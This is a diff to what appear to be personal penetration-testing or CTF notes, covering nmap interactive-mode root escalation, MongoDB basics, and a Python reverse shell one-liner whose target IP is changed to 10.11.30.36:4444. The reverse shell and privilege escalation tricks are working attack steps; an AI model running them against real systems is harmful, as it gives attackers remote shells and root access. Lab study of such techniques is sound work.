@@ -103,7 +103,7 @@ Old version of nmap can be used to escalate to root
 
 `nmap --version` to check version
 
-`nmap --interactive` to enter interacttive mode
+`nmap --interactive` to enter interacttive model
 
 and then `!sh` to get root
 
@@ -360,7 +360,8 @@ If there is `.yml` file involved, it is good to check if  `yaml deserialization 
 <br />
 <br />
 
-`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.170.47",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.30.36",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
+
 
 Python revererse shell one liner
 
@@ -385,3 +386,23 @@ If `/usr/bin/strings` has `suid` bit set, then for sure it is a way to get root
 `sed` is a nice tool ro remove characters from file. 
 
 Syntax is `sed 's/find/replace/' file`
+
+<br />
+<br />
+
+`/dev/shm/` is an alternative for `/tmp` with higher possibility for all permissions
+
+<br />
+<br />
+
+MONGODB
+
+show databases
+
+use db
+
+show tables - shows collections
+
+db.collection.find() - shows records
+
+Mongo jest podatne na nosql injection przez operatory jak $ne itp.
